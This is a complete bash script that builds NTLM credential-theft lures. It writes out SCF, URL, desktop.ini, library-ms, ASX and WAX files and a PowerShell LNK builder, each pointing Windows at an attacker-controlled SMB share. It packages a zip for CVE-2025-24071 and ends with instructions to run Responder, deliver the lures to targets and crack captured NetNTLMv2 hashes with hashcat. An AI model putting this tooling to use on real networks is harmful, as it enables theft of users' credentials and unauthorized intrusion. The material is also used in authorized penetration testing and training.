#!/bin/bash
# Generate multiple NTLM lure file types
# Usage: ./generate_ntlm_lures.sh <attacker_ip> <output_dir>

set -e

if [ $# -lt 2 ]; then
    echo "Usage: $0 <attacker_ip> <output_dir>"
    echo "Example: $0 10.10.14.2 ./lures"
    exit 1
fi

ATTACKER_IP="$1"
OUTPUT_DIR="$2"

mkdir -p "$OUTPUT_DIR"

echo "[*] Generating NTLM lures for attacker IP: $ATTACKER_IP"
echo "[*] Output directory: $OUTPUT_DIR"

# SCF file (Shell Command File)
cat > "$OUTPUT_DIR/shortcut.scf" << EOF
[Shell]
Command=2
IconFile=\\\\$ATTACKER_IP\\share\\icon.ico
[Taskbar]
EOF
echo "[+] Created shortcut.scf"

# URL file (Internet Shortcut)
cat > "$OUTPUT_DIR/website.url" << EOF
[InternetShortcut]
URL=http://intranet
IconFile=\\\\$ATTACKER_IP\\share\\icon.ico
IconIndex=0
EOF
echo "[+] Created website.url"

# LNK file (requires Windows or wine, creating placeholder)
cat > "$OUTPUT_DIR/create_lnk.ps1" << EOF
\$lnk = "\$env:TEMP\\lure.lnk"
\$w = New-Object -ComObject WScript.Shell
\$sc = \$w.CreateShortcut(\$lnk)
\$sc.TargetPath = "\\\\$ATTACKER_IP\\share\\payload.exe"
\$sc.WorkingDirectory = "\\\\$ATTACKER_IP\\share"
\$sc.Description = "Click me"
\$sc.Save()
Move-Item \$lnk "./lure.lnk" -Force
EOF
echo "[+] Created create_lnk.ps1 (run on Windows to generate .lnk)"

# desktop.ini
cat > "$OUTPUT_DIR/desktop.ini" << EOF
[.ShellClassInfo]
IconResource=\\\\$ATTACKER_IP\\share\\icon.ico,0
[ViewState]
Mode=1
EOF
echo "[+] Created desktop.ini"

# library-ms
cat > "$OUTPUT_DIR/documents.library-ms" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\$ATTACKER_IP\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
echo "[+] Created documents.library-ms"

# ASX playlist
cat > "$OUTPUT_DIR/playlist.asx" << EOF
<asx version="3.0">
  <title>Music Playlist</title>
  <entry>
    <title>Track 1</title>
    <ref href="file://$ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
EOF
echo "[+] Created playlist.asx"

# WAX playlist
cat > "$OUTPUT_DIR/playlist.wax" << EOF
<asx version="3.0">
  <title>Audio Playlist</title>
  <entry>
    <ref href="file://$ATTACKER_IP\\share\\audio.mp3" />
  </entry>
</asx>
EOF
echo "[+] Created playlist.wax"

# Create a ZIP with library-ms for CVE-2025-24071
cd "$OUTPUT_DIR"
if command -v zip &> /dev/null; then
    zip -q library.zip documents.library-ms
    echo "[+] Created library.zip (for CVE-2025-24071)"
else
    echo "[!] zip not found, manually create: zip library.zip documents.library-ms"
fi
cd - > /dev/null

echo ""
echo "[*] Lure generation complete!"
echo "[*] Files created in: $OUTPUT_DIR"
echo ""
echo "[+] Next steps:"
echo "    1. Start Responder: sudo responder -I <interface>"
echo "    2. Deploy lures to writable share or deliver to targets"
echo "    3. Wait for NetNTLMv2 capture"
echo "    4. Crack with: hashcat -m 5600 hashes.txt rockyou.txt"
